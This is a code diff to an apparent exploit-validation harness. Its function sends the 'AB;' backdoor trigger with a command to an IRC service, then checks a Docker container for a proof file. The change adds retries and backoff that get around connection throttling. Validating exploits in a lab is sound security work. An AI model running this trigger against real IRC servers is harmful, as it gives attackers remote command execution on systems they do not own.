@@ -1021,7 +1021,8 @@ def irc_backdoor_command_validation(target: str, exploit: dict, use_sudo: bool =
     )
     result["preclean"] = preclean.returncode == 0
     sent = False
-    for connect_attempt in range(1, 4):
+    throttle_banners: list[str] = []
+    for connect_attempt in range(1, 7):
         try:
             with socket.create_connection((target, port), timeout=5) as sock:
                 sock.settimeout(2)
@@ -1031,23 +1032,28 @@ def irc_backdoor_command_validation(target: str, exploit: dict, use_sudo: bool =
                     banner = ""
                 result["banner_preview"] = banner[:300]
                 result["connect_attempts"] = connect_attempt
-                if "throttled" in banner.lower() and connect_attempt < 3:
+                if "throttled" in banner.lower():
                     result["throttle_observed"] = True
-                    time.sleep(8)
+                    throttle_banners.append(banner[:300])
+                    time.sleep(min(30, 8 + (connect_attempt * 4)))
                     continue
                 sock.sendall(f"AB;{command}\n".encode("utf-8"))
                 result["sent_benign_remote_command"] = True
                 sent = True
+                time.sleep(0.5)
                 break
         except Exception as exc:
             result["error"] = repr(exc)
-            if connect_attempt < 3:
+            if connect_attempt < 6:
                 time.sleep(3)
                 continue
             result["elapsed_seconds"] = round(time.perf_counter() - started, 3)
             return result
     if not sent:
         result["reason"] = "Could not send proof command to IRC service after retry/backoff."
+        if throttle_banners:
+            result["reason"] = "IRC service throttled all exploit validation connection attempts."
+            result["throttle_banners"] = throttle_banners
         result["elapsed_seconds"] = round(time.perf_counter() - started, 3)
         return result
 
@@ -1073,6 +1079,8 @@ def irc_backdoor_command_validation(target: str, exploit: dict, use_sudo: bool =
         result["verification_note"] = "Docker verification requires running the CLI with Docker permissions, for example through sudo."
     result["verified"] = verify.returncode == 0
     result["exploited"] = verify.returncode == 0
+    if not result["verified"]:
+        result["reason"] = verify.stderr or "Proof file was not created by the IRC validation command."
     cleanup = run_command(
         ["docker", "exec", CONTAINER, "rm", "-f", EXPLOIT_MARKER],
         timeout=15,
